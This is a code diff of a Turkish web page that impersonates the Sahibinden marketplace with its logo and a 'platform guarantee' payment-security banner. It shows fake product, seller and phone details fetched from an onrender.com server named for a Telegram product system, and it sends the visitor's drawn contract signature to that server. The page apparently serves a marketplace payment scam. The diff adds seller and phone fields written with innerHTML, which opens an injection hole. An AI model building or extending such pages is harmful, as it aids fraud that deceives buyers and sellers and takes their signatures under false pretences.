@@ -30,12 +30,6 @@ body {
     height:28px;
 }
 
-.brand {
-    color:#ffffff;
-    font-size:14px;
-    font-weight:600;
-}
-
 .sub {
     color:#cbd5e1;
     font-size:12px;
@@ -86,13 +80,18 @@ body {
     font-size:13px;
     color:#374151;
     line-height:1.5;
+    margin-bottom:4px;
 }
 
-/* ÜRÜN */
+.product-strong {
+    font-weight:700;
+    color:#111827;
+}
+
 .product-img {
     width:100%;
     border-radius:10px;
-    margin-bottom:8px;
+    margin-bottom:10px;
     background:#fff;
     display:none;
 }
@@ -139,7 +138,6 @@ button {
 
 <body>
 
-<!-- HEADER -->
 <div class="header">
     <div class="header-center">
         <img src="https://upload.wikimedia.org/wikipedia/tr/archive/5/51/20121213095814%21Sahibinden-2010-200px.jpg" class="logo" alt="Logo">
@@ -154,12 +152,13 @@ button {
 🛡️ Bu işlem, ödeme güvenliği sağlamak amacıyla platform güvencesi altında yürütülmektedir.
 </div>
 
-<!-- ÜRÜN BİLGİSİ -->
 <div class="card">
-<div class="title">Ürün Bilgisi</div>
-<img id="pimg" class="product-img" alt="Ürün resmi">
-<div class="text" id="pname">Ürün yükleniyor...</div>
-<div class="text" id="pprice"></div>
+    <div class="title">Ürün Bilgisi</div>
+    <img id="pimg" class="product-img" alt="Ürün resmi" onerror="this.style.display='none'">
+    <div class="text product-strong" id="pname">Ürün yükleniyor...</div>
+    <div class="text product-strong" id="pprice"></div>
+    <div class="text" id="pseller"></div>
+    <div class="text" id="pphone"></div>
 </div>
 
 <div class="card">
@@ -218,14 +217,12 @@ Bu sözleşme elektronik ortamda onaylanarak yürürlüğe girer ve kayıtlar de
 </div>
 </div>
 
-<!-- SIGN -->
 <div class="card">
 <div class="title">İmzanız</div>
 <canvas id="pad"></canvas>
 <button class="secondary" onclick="clearPad()">Temizle</button>
 </div>
 
-<!-- CHECK -->
 <div class="card">
 <label>
 <input type="checkbox" id="check">
@@ -235,7 +232,6 @@ Bu sözleşme elektronik ortamda onaylanarak yürürlüğe girer ve kayıtlar de
 
 </div>
 
-<!-- ACTION -->
 <div class="actions">
 <button class="primary" onclick="send()">Sözleşmeyi Onayla ve İmzala</button>
 </div>
@@ -246,107 +242,116 @@ Bu sözleşme elektronik ortamda onaylanarak yürürlüğe girer ve kayıtlar de
 let pad = null;
 const canvas = document.getElementById("pad");
 
-function resize(){
-  const ratio = Math.max(window.devicePixelRatio || 1, 1);
-  canvas.width = canvas.offsetWidth * ratio;
-  canvas.height = canvas.offsetHeight * ratio;
-  canvas.getContext("2d").scale(ratio, ratio);
-  if (pad) {
-    pad.clear();
-  }
+function resize() {
+    const ratio = Math.max(window.devicePixelRatio || 1, 1);
+    canvas.width = canvas.offsetWidth * ratio;
+    canvas.height = canvas.offsetHeight * ratio;
+    canvas.getContext("2d").scale(ratio, ratio);
+    if (pad) pad.clear();
 }
 
-function initSignature(){
-  try {
-    if (typeof SignaturePad === "undefined") {
-      console.error("SignaturePad yüklenmedi");
-      return;
-    }
-    pad = new SignaturePad(canvas);
-    resize();
-    window.onresize = resize;
-  } catch (err) {
-    console.error("İmza alanı başlatılamadı:", err);
-  }
-}
-
-function clearPad(){
-  if (pad) {
-    pad.clear();
-  }
-}
-
-async function loadProduct(){
-  try {
-    const response = await fetch("https://telegram-product-system.onrender.com/product", {
-      cache: "no-store"
-    });
-
-    if (!response.ok) {
-      throw new Error("Ürün verisi alınamadı");
-    }
-
-    const d = await response.json();
-
-    document.getElementById("pname").innerText = "Ürün Adı: " + (d.name || "-");
-    document.getElementById("pprice").innerText = "Ürün Fiyatı: " + (d.price || "-");
-
-    if (d.image) {
-      const pimg = document.getElementById("pimg");
-      pimg.src = d.image;
-      pimg.style.display = "block";
-    } else {
-      document.getElementById("pimg").style.display = "none";
-    }
-  } catch (err) {
-    console.error("Ürün yükleme hatası:", err);
-    document.getElementById("pname").innerText = "Ürün bilgisi yüklenemedi";
-    document.getElementById("pprice").innerText = "";
-    document.getElementById("pimg").style.display = "none";
-  }
-}
-
-async function send(){
-  if(!document.getElementById("check").checked){
-    alert("Sözleşmeyi kabul etmelisiniz");
-    return;
-  }
-
-  if(!pad){
-    alert("İmza alanı yüklenemedi");
-    return;
-  }
-
-  if(pad.isEmpty()){
-    alert("İmza gereklidir");
-    return;
-  }
-
-  const data = pad.toDataURL();
-
-  try {
-    const response = await fetch("https://telegram-product-system.onrender.com/submit", {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        signature: data,
-        product:{
-          name: document.getElementById("pname").innerText,
-          price: document.getElementById("pprice").innerText,
-          image: document.getElementById("pimg").src
+function initSignature() {
+    try {
+        if (typeof SignaturePad === "undefined") {
+            console.error("SignaturePad yüklenmedi");
+            return;
         }
-      })
-    });
+        pad = new SignaturePad(canvas);
+        resize();
+        window.onresize = resize;
+    } catch (err) {
+        console.error("İmza alanı başlatılamadı:", err);
+    }
+}
 
-    if (!response.ok) {
-      throw new Error("Gönderim başarısız");
+function clearPad() {
+    if (pad) pad.clear();
+}
+
+async function loadProduct() {
+    try {
+        const response = await fetch("https://telegram-product-system.onrender.com/product", {
+            cache: "no-store"
+        });
+
+        if (!response.ok) {
+            throw new Error("Ürün verisi alınamadı");
+        }
+
+        const d = await response.json();
+
+        document.getElementById("pname").innerHTML =
+            "<b>Ürün Adı:</b> " + (d.name || "-");
+
+        document.getElementById("pprice").innerHTML =
+            "<b>Ürün Fiyatı:</b> " + (d.price || "-");
+
+        document.getElementById("pseller").innerHTML =
+            "Satıcı: " + (d.seller || "-");
+
+        document.getElementById("pphone").innerHTML =
+            "Telefon: " + (d.phone || "-");
+
+        if (d.image) {
+            const pimg = document.getElementById("pimg");
+            pimg.src = d.image;
+            pimg.style.display = "block";
+        } else {
+            document.getElementById("pimg").style.display = "none";
+        }
+    } catch (err) {
+        console.error("Ürün yükleme hatası:", err);
+        document.getElementById("pname").innerText = "Ürün bilgisi yüklenemedi";
+        document.getElementById("pprice").innerText = "";
+        document.getElementById("pseller").innerText = "";
+        document.getElementById("pphone").innerText = "";
+        document.getElementById("pimg").style.display = "none";
+    }
+}
+
+async function send() {
+    if (!document.getElementById("check").checked) {
+        alert("Sözleşmeyi kabul etmelisiniz");
+        return;
     }
 
-    alert("Sözleşme başarıyla gönderildi");
-  } catch (err) {
-    console.error("Gönderim hatası:", err);
-    alert("Gönderim sırasında hata oluştu");
-  }
+    if (!pad) {
+        alert("İmza alanı yüklenemedi");
+        return;
+    }
+
+    if (pad.isEmpty()) {
+        alert("İmza gereklidir");
+        return;
+    }
+
+    const data = pad.toDataURL();
+
+    try {
+        const response = await fetch("https://telegram-product-system.onrender.com/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                signature: data,
+                product: {
+                    name: document.getElementById("pname").innerText,
+                    price: document.getElementById("pprice").innerText,
+                    seller: document.getElementById("pseller").innerText,
+                    phone: document.getElementById("pphone").innerText,
+                    image: document.getElementById("pimg").src
+                }
+            })
+        });
+
+        if (!response.ok) {
+            throw new Error("Gönderim başarısız");
+        }
+
+        alert("Sözleşme başarıyla gönderildi");
+    } catch (err) {
+        console.error("Gönderim hatası:", err);
+        alert("Gönderim sırasında hata oluştu");
+    }
 }
 
 loadProduct();
